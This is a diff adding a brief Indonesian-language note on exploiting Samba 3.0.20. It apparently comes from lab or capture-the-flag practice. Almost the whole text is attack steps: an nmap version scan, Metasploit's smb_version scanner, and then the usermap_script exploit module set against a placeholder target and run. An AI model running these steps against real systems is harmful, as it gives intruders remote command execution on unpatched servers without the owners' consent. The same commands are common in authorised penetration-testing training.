@@ -1,0 +1,23 @@
+## exploit samba versi 3.0.20,saba ini berjalan di port 139 
+# enumeration dengan nmap
+$ nmap -sV <ip target>
+# tetapi kita mendapatkan output samba dengan versi 3.x-4.x
+# untuk mengetahui versi lengkap nya kita bisa menggunakan modul metasploit auxiliary/acannner/smb/smb_version
+#
+# buka metasploit
+$  msfconsole
+# di metaploit cari gunakan modulnya
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 (auxiliary/scanner/smb/smb_version) > set RHOSTS <ip target>
+msf6 (auxiliary/scanner/smb/smb_version) > run
+
+# dan kita bisa melihat outputnya ada versi samba versi 3.0.20 debian
+# kita sekarang mencari exploitnya
+msf6 > search smb 3.0.20
+# dan kita mendapatkan
+exploit/multi/samba/usermap_script
+# gunakan module nya
+msf6 > use exploit/multi/samba/usermap_script
+msf6 (exploit/multi/samba/usermap_script) > set RHOSTS <ip target>
+msf6 (exploit/multi/samba/usermap_script) > run
+
